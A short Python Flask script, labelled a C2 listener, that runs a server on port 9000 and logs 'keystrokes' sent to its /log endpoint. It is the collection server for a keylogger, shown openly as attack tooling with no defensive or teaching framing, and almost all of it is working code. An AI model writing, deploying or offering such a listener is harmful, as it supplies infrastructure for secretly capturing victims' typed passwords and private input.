
# __define-ocg__: C2 Listener
from flask import Flask, request
app = Flask(__name__)

@app.route('/log')
def log_key():
    key = request.args.get('key', '')
    print(f"[+] Keystroke: {key}")
    return '', 204

if __name__ == "__main__":
    print("[*] Listening on http://localhost:9000/log")
    app.run(host="0.0.0.0", port=9000)
